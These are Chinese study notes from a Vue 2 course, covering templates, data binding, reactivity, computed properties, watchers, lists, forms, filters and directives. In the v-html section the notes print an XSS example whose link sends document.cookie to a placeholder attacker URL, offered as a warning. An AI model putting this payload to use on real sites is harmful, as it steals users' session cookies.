# Vue-尚硅谷课程

总体

- vue基础
- vue-cli
- vue-router
- vuex
- element-ui
- vue3

# 第一章 Vue核心

P2 Vue简介

## 1.1、Vue简介

### 1.1.1、Vue是什么

一套用于构建用户界面（即：将拿到的数据通过某种方式变成用户看到的界面）的渐进式JS框架。

渐进式：Vue可以自底向上逐层的应用

	- 简单应用：只需要一个轻量小巧的核心库
	- 复杂应用：可以引入各种各样的Vue插件

### 1.1.2、特点

1、采用组件化模式，提高代码复用率、且让代码更好维护；（xx.vue包含html/css/js）

2、声明式编码，让编码人员无需直接操作DOM，提高开发效率；

命令式编码：写一步动一步

![](img/微信截图_20211113231816.png)

3、使用虚拟DOM+优秀的Diff算法，尽量复用DOM节点；（原来的js展示数据，每次都要重新渲染，或者是自己也可以比较，但是diff算法不好。）

![](img\微信截图_20211113232211.png)

vue实现：

它把新的虚拟DOM和旧的虚拟DOM进行比较，之前标签一样的它就复用了，只有赵六是新的。

![](img\微信截图_20211113232250.png)

#### 4、学习Vue之前要掌握的JS基础知识

ES语法规范，ES6模块化，包管理器(npm或者yarn或者cnpm)，原型、原型链，数组常用方法，axios，promise

P3 官方使用指南

### 1.1.3、Vue官网

英文官网: https://vuejs.org/

中文官网: https://cn.vuejs.org/

导航栏：

学习-教程（官方出的入门文档）和API（Vue的字典，最开始不去看，不会的再去查）是最重要的两个，风格指南（Vue推荐的写法），Cookbook（Vue推荐的小技巧）

生态-工具和核心插件

资源-Awesome vue.js（别人写好的三方库，比如报表）

P4搭建Vue开发环境——学习-教程

## 1.2、初识 Vue

### 1.2.1、js引入Vue

1 下载安装

- 开发版本：vue.js

- 生产版本：vue.min.js

```js
<!-- 引入Vue，引入了以下js之后，全局就多了一个Vue对象 -->
<script type="text/javascript" src="../js/vue.js"></script>
```

直接引入之后，控制台会出现警告

![](img\微信截图_20211114155352.png)

2 安装Vue Devtools

然后浏览器添加扩展小工具

正常上网的可以选择安装Vue Devtools

![](img\微信截图_20220830233003.png)

然后选择Installation选项中的Get the Chrome Extension

无法正常上网只能使用老师提供的安装包（vue全家桶/05_其他/vue_dev_tools.crx）

3 关闭提示

![](img\微信截图_20211114155804.png)

```js
<script type="text/javascript" >
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
</script>
```

P5 Hello小案例

此时控制台有错误：the server responded with a status of :5500/favicon.ico 404 (Not Found)

这是浏览器默认行为，它会自动的请求页签图标。（live server插件会自动在本机5500的端口开了一台内置的小服务器，并且把你整个工程所有的文件都作为这台服务器的根资源去使用，访问localhost:5500看一下）



要使用Vue，需要new Vue()，然后才能开启使用Vue。此构造函数接受的参数是一个配置对象，可以看见，配置对象的键是不能改的。

容器中变化的数据要交给Vue实例来管理。

```js
new Vue({
    el:'#demo', //el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串。el是element的简称
    data:{ //data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象。
        name:'atguigu',
        address:'北京'
    }
})
```

先有了容器，然后有了绿色的Vue实例，当Vue实例开始工作的时候，它就知道了要把容器整个拿过来，然后去解析有没有自己设计的特殊语法（比如插值），解析到了，就用data中的数据的值把特殊语法替换掉，然后就把整个容器替换了。

### 1.2.2、Vue的使用

初识Vue：

- 1.想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象；
- 2.root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法；
- 3.root容器里的代码被称为【Vue模板】；

P6 分析Hello案例

- 4.<font color='red'>Vue实例和容器是一一对应的</font>；即一个Vue实例只能去解析一个容器，一个容器也只能被一个Vue实例解析
- 5.真实开发中只有一个Vue实例，并且会配合着组件一起使用；
- 6.{{xxx}}中的xxx要写**js表达式**，且xxx可以自动读取到data中的所有属性；
- 7.一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新；

注意区分：js表达式 和 js代码(语句)

​            1.表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方：

​                  (1). a

​                  (2). a+b

​                  (3). demo(1)

​                  (4). x === y ? 'a' : 'b'

​            2.js代码(语句)

​                  (1). if(){}

​                  (2). for(){}



![](img\微信截图_20220831000650.png)

P7 模板语法

## 1.3、模板语法

主要分为两类：插值语法和指令语法

Vue模板语法有2大类：

​          1.插值语法：

​              功能：用于解析标签体内容。

​              写法：{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性。

​          2.指令语法：

​              功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）。

​              举例：v-bind:href="xxx" 或 简写为 :href="xxx"，xxx同样要写js表达式，

​                   且可以直接读取到data中的所有属性。

​              备注：Vue中有很多的指令，且形式都是：v-????，此处我们只是拿v-bind举个例子。

​			v-bind可以给标签里面任何属性去绑定data中对应的值

P8 数据绑定

## 1.4、数据绑定

Vue中有2种数据绑定的方式：

​          1.单向绑定(v-bind:)：数据只能从data流向页面。

​          2.双向绑定(v-model:)：数据不仅能从data流向页面，还可以从页面流向data。

​            备注：

​                1.<font color = 'red'>双向绑定一般都应用在表单类元素上</font>（如：input、select等）

​                2.v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。



P9 el与data的两种写法

vscode :设置-用户代码片段可以设置快捷代码

## 1.5、el与data的两种写法

```js
//方式一
const v = new Vue({
    el:'#root', 
    data:{
    	name:'尚硅谷'
    }
    })
console.log(v)

//方式二
const v = new Vue({
    data:{
   	 name:'尚硅谷'
    }
})
    console.log(v)
v.$mount('#root') 
```

Vue实例

![](img\微信截图_20211114165408.png)

data与el的2种写法

​          1.el有2种写法

​                  (1).new Vue时候配置el属性。

​                  (2).先创建Vue实例，随后再通过vm.$mount('#root')指定el的值。

​          2.data有2种写法

​                  (1).对象式

​                  (2).函数式

​                  如何选择：目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错。

​          3.一个重要的原则：

​                  由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了。

```js
//data的两种写法
new Vue({
    el:'#root',
    //data的第一种写法：对象式
    /* data:{
				name:'尚硅谷'
			} */

    //data的第二种写法：函数式
   // data:function(){} 但一般在一个对象里面写方法时候会简写去掉:function
    data(){
        console.log('@@@',this) //此处的this是Vue实例对象，因为是Vue实例在调用
        return{
            name:'尚硅谷'
        }
    }
})
```

箭头函数没有自己的this,就会往外找，就找到了全局的window.

P10 理解MVVM

## 1.6、 MVVM模型

1. M：模型(Model) ：data中的数据

2. V：视图(View) ：模板代码

3. VM：视图模型(ViewModel)：Vue实例

![](img\微信截图_20211114172825.png)

观察发现：

1.data中所有的属性，最后都出现在了vm身上。

2.**vm身上所有的属性 及 Vue原型上所有属性**，在Vue模板中都可以直接使用。

P11 Object.defineProperty

## 1.7、数据代理

当在js中直接写，

```js
let person = {
				name:'张三',
				sex:'男',
				age:18
			}
console.log(person)
```

可以看到控制台三个属性一样颜色

![](img\微信截图_20220831212627.png)



### 1.7.1、Object.defineProperty（）

![](img\微信截图_20211114173908.png)

不可以枚举：比如Object.keys()方法就不会遍历到age属性，比如for循环也不能获取到属性。



```js
let number = 18
//这种方式是可以被遍历的
let person = {
    name:'张三',
    sex:'男',
}
//给某个对象添加属性  对象，属性，配置项（可以控制属性的各种配置项）
Object.defineProperty(person,'age',{
    // value:18,
    // enumerable:true, //控制属性是否可以枚举，默认值是false
    // writable:true, //控制属性是否可以被修改，默认值是false
    // configurable:true //控制属性是否可以被删除，默认值是false

    //当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
    get(){
        console.log('有人读取age属性了')
        return number
    },

    //当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
    set(value){
        console.log('有人修改了age属性，且值是',value)
        number = value
    }

})
console.log(Object.keys(person))
```

P12 理解数据代理

P13 Vue中的数据代理

### 1.7.2、数据代理

数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）

```js
<div id="root">
			<h2>学校名称：{{name}}</h2>
			<h2>学校地址：{{address}}</h2>
		</div>

<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				address:'宏福科技园'
			}
		})
	</script>
```

查看vm实例

![](img\微信截图_20220831214137.png)

当有人获取vm中的name属性时候，getter就工作，就把data中的name给过去。（红线）

当有人通过vm去改变name属性时，setter就工作，然后就把data中的name改掉了。（蓝线）

验证vm的name是否是data.name

- 红线： 获取vm.name，然后修改data.name，再获取vm.name看是否改变

- 蓝线：执行 vm.name='atguigu' ,本来可以去看vm._data去验证，但是现在不建议，因为里面使用了数据劫持，现在还不会。所以采用以下方式。验证vm._data === data

  ![](img\微信截图_20220831220802.png)



1.Vue中的数据代理：

​              通过vm对象来代理data对象中属性的操作（读/写）。把data里面的数据放到vm了一份

2.Vue中数据代理的好处：

​              更加方便的操作data中的数据

 3.基本原理：

​              通过Object.defineProperty()把data对象中所有属性添加到vm上。

​              为每一个添加到vm上的属性，都指定一个getter/setter。

​              在getter/setter内部去操作（读/写）data中对应的属性。

如果没有数据代理，获取数据不能直接vm.属性了，需要vm._data.属性。

![](img\微信截图_20220831221344.png)

（注意，谷歌浏览器的console的vm中的_data有数据劫持（为了实现data中的数据改变页面也改变））

P14 事件处理

## 1.8、事件处理

### 1.8.1、基本使用

所有被Vue管理的函数都尽量不要写成箭头函数，因为这样this就指向了window。

Vue中data里面的属性出现在vm上是通过数据代理，而方法methods里面的东西不是代理的。

当然，方法也可以写在data中，但是这样会让Vue很累，因为卸载data中的属性会做数据代理。



事件的基本使用：

​              1.使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名；

​              2.事件的回调需要配置在methods对象中，最终会在vm上；

​              3.methods中配置的函数，不要用箭头函数！否则this就不是vm了；

​              4.methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；

​              5.@click="demo" 和 @click="demo($event)" 效果一致，但后者可以传参；

P15 事件修饰符

### 1.8.2、事件修饰符

Vue中的事件修饰符：

​            1.prevent：阻止默认事件（常用）；

```
@click.prevent="showInfo"//这样写了会执行showInfo方法，但是会阻止默认行为，比如a标签的跳转
```

​            2.stop：阻止事件冒泡（常用）；

​            3.once：事件只触发一次（常用）；

​            4.capture：使用事件的捕获模式，就是方法在捕获时就执行；

​            5.self：只有event.target是当前操作的元素时才触发事件；

​            6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕；移动端项目使用比较多

```js
<!-- 事件的默认行为立即执行，无需等待事件回调执行完毕；
			@scroll 滚动事件，是给滚动条添加的滚动事件
			@wheel 滚动事件，鼠标滚轮

			@whell:鼠标滚轮滚动，执行demo，执行完成之后，滚动条才动。
            加了passive，滚动条会立即执行
			-->
			<ul @wheel.passive="demo" class="list">
				<li>1</li>
				<li>2</li>
				<li>3</li>
				<li>4</li>
			</ul>
//====
demo(){
					for (let i = 0; i < 100000; i++) {
						console.log('#')
					}
					console.log('累坏了')
				}
```

P16 键盘事件

### 1.8.3、键盘事件

1.Vue中常用的按键别名：

​              回车 => enter

​              删除 => delete (捕获“删除”和“退格”键)

​              退出 => esc

​              空格 => space

​              换行 => tab (<font color='red'>特殊，要配合keydown去使用，因为tab键是移动光标，keyup事件发生时候光标已经切走了</font>)

​              上 => up

​              下 => down

​              左 => left

​              右 => right

```html
<div id="root">
    <--表示只有按下回车键才执行showInfo--/>
    <input type="text" placeholder="按下回车提示输入" @keydown.enter="showInfo">
</div>
```

2.Vue未提供别名的按键，可以使用按键原始的key值（就是event.key）去绑定，但注意要转为kebab-case（短横线命名）不是所有按键都可以绑定事件

e.key,e.keyCode

Control 13

caps-lock 

3.系统修饰键（用法特殊）：ctrl、alt、shift、meta(win键)

​              (1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。

​              (2).配合keydown使用：正常触发事件。

4.也可以使用keyCode去指定具体的按键（不推荐，因为在mdn网站中搜索keyCode，可以看到该特性已经从Web标准中删除，也许未来会移除）

5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名（一般也不推荐）

```js
Vue.config.keyCodes.huiche = 13 //定义了一个别名按键
```

P17 事件总结

修饰符也能连着写

```html
@click.prevent.stop="showInfo"
```

修饰符也能指定，比如ctrl键只有按下y键才能执行

```html
@keyup.ctrl.y="showInfo"
```

P18 姓名案例

需求：一个框输入姓，一个框输入名，第三行展示全名（联动，姓或者名改了全名都会跟着改）

插值语法中的表达式一定要简单！

插值语法中的表达式也可以是methods定义的方法名，

```html
<!-- 之前调用事件方法的时候加不加小括号都可以，但是这里的插值加了小括号是使用的函数的返回值，不加小括号是直接返回的函数对象 -->
			全名：<span>{{fullName()}}</span>

new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三'
			},
			methods: {
				// 在这个函数里面怎么能拿到姓和名呢？？？普通函数里面的this是外面的Vue实例vm
				/*
				在Vue中data中任何一个数据发生变化，Vue的模块都会重新解析一遍，解析到{{fullName()}}的时候，它发现是调用的函数，所以又会重新调用函数一次
								*/
				fullName(){
					console.log('@---fullName')
					return this.firstName + '-' + this.lastName
				}
			},
		})
```

P19 计算属性

## 1.9、计算属性 computed

Vue中认为data中的称为Property

1. 定义：要显示的数据不存在，要通过计算得来。 就是拿着已经有的属性去加工得到的新属性。

2. 原理：底层借助了Object.defineProperty方法提供的getter和setter。vm._data中没有计算属性，它是通过计算直接丢到vm身上。定义计算属性 fullName是一个对象，它会把get方法返回的值赋到vm身上以fullName为key，get返回为值。

3. get函数什么时候执行？

   1.初次读取fullName时。2.所依赖的数据发生变化时。

4. 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。

5. 备注：

   1. 计算属性最终会出现在vm上，直接读取使用即可。
   2. 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生变化。

6. 在页面中使用{{方法名}}来显示计算的结果。

```js
const vm = new Vue({
    ······
    computed:{
        // 用计算属性比methods好的地方有：计算属性会读取缓存，而methods每次都会调用
        fullName:{
            //get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
            //get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
            get(){
                console.log('get被调用了')
                // console.log(this) //此处的this是vm
                return this.firstName + '-' + this.lastName
            },
            //set什么时候调用? 当fullName被修改时。如果不需要set，可以不写，但是get是必须的
            set(value){
                console.log('set',value)
                const arr = value.split('-')
                this.firstName = arr[0]
                this.lastName = arr[1]
            }
        },
       
    }
    
    
})
```

P20 简写

```
     //简写 ，确定计算属性只读不改，就可以用简写形式了
        fullName(){
            console.log('get被调用了')
            return this.firstName + '-' + this.lastName
        }
```

P21 天气案例

## 1.10、监视属性

> 小案例：
>
> 一个文本框——今天天气很凉爽，旁边有一个按钮，点一次按钮凉爽变为炎热，再点一次就变回凉爽

推荐vscode插件：Vue 3 Snippets hollowtree。

使用插值、methods、computed实现。

注意：当操作过后，页面显示不会变化，vue开发者工具的值不会更新。（算bug也算feature）

```html
<!-- 绑定事件的时候：@xxx="yyy" yyy可以写一些简单的语句，但是yyy涉及的属性或者方法必须是vm上有的 -->
<button @click="isHot = !isHot">切换天气</button> 
```

P22 监视属性

#### 1.10.1、普通监视属性写法

1. 通过 vm 对象的$watch()或 watch 配置来监视指定的属性 
2. 当属性变化时, 回调函数自动调用, 在函数内部进行计算

```js
const vm = new Vue({
    ······
    //方式一 其实这里的isHot原始写法也是'isHot'，只是习惯一般都不写
    watch:{
        isHot:{
            //监视属性：主要用于需要新旧值的时候
            immediate:true, //初始化时让handler调用一下
            //handler什么时候调用？当isHot发生改变时。
            handler(newValue,oldValue){
                console.log('isHot被修改了',newValue,oldValue)
            }
        },
        //简写，当配置项只有handler时
        isHot(newValue,oldValue){
            console.log('isHot被修改了',newValue,oldValue,this)
        } 
    } 
})
//方式二：这种方式的watch ,被监视的属性要用''才可以。其实写在vm里面的watch 的属性也应该用''，但是可以省略
vm.$watch('isHot',{
    deep:true,
    immediate:true, //初始化时让handler调用一下
    //handler什么时候调用？当isHot发生改变时。
    handler(newValue,oldValue){
        console.log('isHot被修改了',newValue,oldValue)
    }
})

```

P23 深度监视

#### 1.10.2、深度监视

```js
watch:{
    //监视多级结构中所有属性的变化
    numbers:{
        deep:true,
        handler(){}        
    }
}
```

P24 简写模式

#### 1.10.3、简写模式

```js
//简写
vm.$watch('isHot',function(){
    console.log('isHot被修改了',newValue,oldValue,this)
})
```

P25 watch与computed

#### 1.10.4、computed与watch区别

**computed和watch之间的区别：**

1.computed能完成的功能，watch都可以完成。

2.watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作，computed属性不能通过异步返回返回值

 **重要的小原则**：

1.所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。

 2.所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象。

 3.箭头函数不会创建this!!!

#### 关于由vue管理的函数和不由vue管理的函数的使用

如图,箭头函数不会创建this，所以往外找，往外就是firstName，是一个普通函数，所以this就是vm；

如果把定时器任务写成普通函数，因为是浏览器调用，所以this就指向了window

```js
watch:{
				
				firstName(val){
					setTimeout(()=>{
						console.log(this)
						this.fullName = val + '-' + this.lastName
					},1000);
				}
			}
```

P26 class样式

## 1.11、class与style绑定

### 1.11.1、理解

1. 在应用界面中，某个元素的样式是变化的
2. class/style绑定就是专门用来实现动态样式效果的技术

### 1.11.2、class绑定

1. :class='xxx' 
2. 表达式是字符串: 'classA' ，适用于：样式的类名不确定，需要动态指定
3. 表达式是对象: {classA:isA, classB: isB}，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用
4. 表达式是数组: ['classA', 'classB']，适用于：要绑定的样式个数不确定、名字也不确定

P27 style样式

### 1.11.3、style绑定

1. :style="{ color: activeColor, fontSize: fontSize + 'px' }" 

2. 其中 activeColor/fontSize 是 data 属性

P28 条件渲染

## 1.12、条件渲染

1. v-if
   1. v-if="表达式" 
   2. 适用于：切换频率较低的场景。
   3. 特点：不展示的DOM元素直接被移除。
   4. 注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”
   5. v-if与template的配合使用 ，template不会影响页面结构，template只能和v-if配合
2. v-show
   1. 通过display:none

```html
<h2 v-show="false">欢迎来到{{name}}</h2>
<h2 v-show="1 === 1">欢迎来到{{name}}</h2>

<!-- 使用v-if做条件渲染 -->
<h2 v-if="false">欢迎来到{{name}}</h2>
<h2 v-if="1 === 1">欢迎来到{{name}}</h2>
```

P29 列表渲染

## 1.13、列表渲染

### 1.13.1、v-for

v-for指令: 你想生成多个谁，就在谁的标签上加 v-for

​            1.用于展示列表数据

​            2.语法：v-for="(item, index) in xxx" :key="yyy"

​            3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）

```js
data:{
    //每条数据都必须有唯一值字段
    persons:[
        {id:'001',name:'张三',age:18},
        {id:'002',name:'李四',age:19},
        {id:'003',name:'王五',age:20}
    ],
        car:{
            name:'奥迪A8',
                price:'70万',
                    color:'黑色'
        },
            str:'hello'
}
```

展示

```html
<!--遍历数组-->
<!-- 也可以这样写 <li v-for="p in persons" v-bind:key="p.id"> -->
<li v-for="(p,index) in persons" :key="index">
    {{p.name}}-{{p.age}}
</li>

<!-- 遍历对象 -->	
<h2>汽车信息（遍历对象）</h2>
<ul>
    <li v-for="(value,k) of car" :key="k">
        {{k}}-{{value}}
    </li>
</ul>

<!-- 遍历字符串 -->
<h2>测试遍历字符串（用得少）</h2>
<ul>
    <li v-for="(char,index) of str" :key="index">
        {{char}}-{{index}}
    </li>
</ul>
```

P30 key的作用与原理

### 1.13.2、key的原理

当使用:key="index"或者不写key属性时候，会出现一种bug

如图：

![](img\微信截图_20220903210336.png)

输入文本框

![](img\微信截图_20220903210415.png)

点击【添加一个老刘】按钮，程序中需求是在数组前面添加一行

![](img\微信截图_20220903210507.png)

然后就出现bug了。

遍历列表时key的作用：

![](img\微信截图_20220903222540.png)

对比虚拟DOM时，如果和旧的一样，就用旧的，不一样就用新的。

![](img\微信截图_20220903222811.png)

备注：如果遍历时候没有写key，vue会默认将index作为key。

**总结面试**

> react、vue中的key有什么作用？（key的内部原理）

1. 虚拟DOM中key的作用:

key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：

2. 对比规则
   1. 旧虚拟DOM中找到了与新虚拟DOM相同的key:
      1. 若虚拟DOM中内容没变, 直接使用之前的真实DOM！
      2. 若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
   2. 旧虚拟DOM中未找到与新虚拟DOM相同的key
      1. 创建新的真实DOM，随后渲染到到页面。
3. 用index作为key可能会引发的问题
   1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作:会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低
   2. 如果结构中还包含输入类的DOM：会产生错误DOM更新 ==> 界面有问题。
4. 开发中如何选择key?:
   1. 最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
   2. 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的。

P31 列表过滤

用computed

P32 列表排序

P33 更新时的一个问题

```html
<button @click="updateMei">更新马冬梅的信息</button>
<ul>
    <li v-for="(p,index) of persons" :key="p.id">
        {{p.name}}-{{p.age}}-{{p.sex}}
    </li>
</ul>
```

```js
methods: {
    updateMei(){
        // this.persons[0].name = '马老师' //奏效
        // this.persons[0].age = 50 //奏效
        // this.persons[0].sex = '男' //奏效
        // this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效,Vue监测不到，但是实际上修改成功
    }
}
```

P34 Vue监测数据的原理_对象

### 1.13.3 Vue监测对象的原理

回顾数据代理

![](img\微信截图_20220831221344.png)

图中黄线实际上有两步：

- 加工data （如果不加工，则vm._data则与data完全一样了），加工了就能做响应式了（即数据变了页面跟着变）
- vm._data = data

这里有人提出不加工也可以实现响应式，见“7.模拟一个数据监测.html”

实际上Vue的监测就是通过set来实现的（观察者模式）

P35 Vue.set()方法

当需要给已经有的数据添加新的属性

```js
vm._data.student.age = 18;
```

这样能添加上属性，但是这个属性不是响应式的，它没有getter和setter的处理，所以也不会展示在页面上。

基于此，Vue提供了api

```js
Vue.set(target,key,value)//这个api不能给data增加属性！！！！不能给vm直接添加
//还有一个api
vm.$set(target,key,value)
```

P36 Vue监测数据的原理——数组

Vue是不会为属性为数组的里面的每个对象创建对应的get\set方法的（<font color = 'red'>但是对象里面的每个属性是响应式的！</font>f），所以之前在5那个文档修改数据索引 ，虽然Vue中的数据已经修改了，但是对应页面数据是不生效的。只有调用了push pop shift unshift splice sort reverse 这几个本身改变原数组的api 才可以引起页面的改动。

Vue是如何监测的呢，Vue用了包装，当你在获取到Vue中的数组对象，然后调用api的时候，它已经不是原始的数组了（Array.prototype.push）,而是Vue给你写的数组
Vue给你写的数组做了两件事
	1、规规矩矩调用了原始的Array.prototype.push
	2、重新解析模板

P37 总结Vue监视数据

Vue是不会为属性为数组的里面的每个对象创建对应的get\set方法的（<font color = 'red'>但是对象里面的每个属性是响应式的！</font>f），

```js
updateFirstFriendName(){
    //数组中的某个对象的属性是响应的！！因为有对应的get/set
    this.student.friends[0].name = '张三'
    //这种是不被监测的
    this.student.friends[0] = '123'
},
```



总结：Vue监视数据的原理：

1. vue会监视data中所有层次的数据。
2. 如何监测对象中的数据？
   1. 通过setter实现监视，且要在new Vue时就传入要监测的数据。
      1. 对象中后追加的属性，Vue默认不做响应式处理
      2. 如需给后添加的属性做响应式，请使用如下API：Vue.set(target，propertyName/index，value) 或 vm.$set(target，propertyName/index，value)
3. 如何监测数组中的数据？
   1. 通过包裹数组更新元素的方法实现，本质就是做了两件事：
      1. 调用原生对应的方法对数组进行更新。
      2. 重新解析模板，进而更新页面。
4. 在Vue修改数组中的某个元素一定要用如下方法：
   1. 使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
   2. Vue.set() 或 vm.$set()

特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！



#### 数据劫持

把本来data的属性变成getter setter形式（就像student属性被修改了，马上就被setter劫持了）

P38 收集表单

## 1.14、收集表单数据

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>收集表单数据</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器  v-model收集的是value值！！！-->
		<div id="root">
			<form @submit.prevent="demo">
				账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
				密码：<input type="password" v-model="userInfo.password"> <br/><br/>
				<!-- 一般input和v-model.number都要一起用 -->
				年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
				性别：
				男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
				女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
				<!--hobby的初始值会影响多选框的收集，hobby:[]可以正常收集, hobby:''会收集checked  -->
				爱好：
				学习<input type="checkbox" v-model="userInfo.hobby" value="study">
				打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
				吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
				<br/><br/>
				所属校区
				<select v-model="userInfo.city">
					<option value="">请选择校区</option>
					<option value="beijing">北京</option>
					<option value="shanghai">上海</option>
					<option value="shenzhen">深圳</option>
					<option value="wuhan">武汉</option>
				</select>
				<br/><br/>
				其他信息：
				<textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
				<input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
				<button>提交</button>
			</form>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		new Vue({
			el:'#root',
			data:{
				userInfo:{
					account:'',
					password:'',
					age:18,
					sex:'female',
					hobby:[],
					city:'beijing',
					other:'',
					agree:''
				}
			},
			methods: {
				demo(){
					console.log(JSON.stringify(this.userInfo))
				}
			}
		})
	</script>
</html>
```

**收集表单数据**：

- 若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
- 若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
- 若：<input type="checkbox"/>
  - 1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
  - 2.配置input的value属性:
    - (1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
    - (2)v-model的初始值是数组，那么收集的的就是value组成的数组

备注：v-model的三个修饰符：

- lazy：失去焦点再收集数据
- number：输入字符串转为有效的数字
- trim：输入首尾空格过滤

P39 过滤器

## 1.15、过滤器

[BootCDN](https://www.bootcdn.cn/) 前端大量三方库收集库

过滤器本质就是函数。（已经在Vue3中移除了）

1. 功能: 对要显示的数据进行特定格式化后再显示 
2. 注意: 并没有改变原本的数据, 是产生新的对应的数据
3. 有局部过滤器和全局过滤器
4. 只应用于插值语法和v-bind

```js
<script type="text/javascript">
    //全局过滤器，必须在new Vue()之前准备好
    Vue.filter('mySlice',function(value){
        return value.slice(0,4)
    })

    new Vue({

        //局部过滤器  (组件就是一个微型的vm,虽然一般工程只有一个vm，但是有多个组件，过滤器这种是局部的！！)
        filters:{
            // ES6 新语法 直接在定义参数这里写默认传参
            timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
                // console.log('@',value)
                return dayjs(value).format(str)
            },
            mySlice(value) {
                return value.slice(0,4)
            }
        }
})
</script>

//使用
<!-- 过滤器实现 一个管道符 -->
<h3>现在是：{{time | timeFormater}}</h3>
<!-- 过滤器实现（传参） -->
<h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
<h3 :x="msg | mySlice">尚硅谷</h3>
```

P40 v-text指令

我们之前学习的v-bind v-model v-on都是内置指令

## 1.16、内置指令与自定义指令

### 1.16.1. 常用内置指令

**学习过的指令**

1. v-if : 如果为 true, 当前标签才会输出到页面 
2. v-else: 如果为 false, 当前标签才会输出到页面 
3. v-show : 通过控制 display 样式来控制显示/隐藏 
4. v-for : 遍历数组/对象 
5. v-on : 绑定事件监听, 一般简写为@ 
6. v-bind : 绑定解析表达式, 可以省略 v-bind 
7. v-model : 双向数据绑定 



1. v-text : 更新元素的 textContent 
   - 作用：向其所在的节点中渲染文本内容。把文本内容都当成普通字符串看！
   - 与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。

P41 v-html

1. v-html : 更新元素的 innerHTML 
   - v-html会替换掉节点中所有的内容，{{xx}}则不会。
   - v-html可以识别html结构。比如你写html结构，它会渲染，而不是把它当作普通字符串
   - 但是它有安全性问题（要把node.js课程里的cookie内容懂才可以）
     - 在网站上动态渲染任意HTML是非常危险的，容易导致XSS（跨站脚本漏洞，冒充用户之手）攻击。
     - 一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上！

![](img\微信截图_20220905204412.png)

cookie不是跨浏览器的。

提升工作效率，浏览器插件 Cookie-Editor 。能够批量导入导出。

当你在访问A网站时候，浏览器的cookie中有敏感信息，A网站有偷窃代码

```html
<div id="root">
	<div v-html="str2"></div>
</div>

new Vue({
			el:'#root',
			data:{
				str2:'<a href=javascript:location.href="http://要做坏事的网站?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
			}
		})
```

这样点击div的时候，就会把浏览器中的敏感信息传输到坏事服务器上。比如你把上面str2在百度贴吧的回复内容上，这样别人点击的时候就会带过来敏感数据。

但同时，浏览器也做了自己的安全，如果cookie中该键值对被勾选了HTTP（这个其实是服务器返回的），那么document.cookie代码就获取不到该cookie

![](img\微信截图_20220905205616.png)



P42 v-cloak

当js引入在模板之后，由于js返回网速较慢，页面上会出现未被解析的模板的原始代码，比如

```html
{{name}}
```

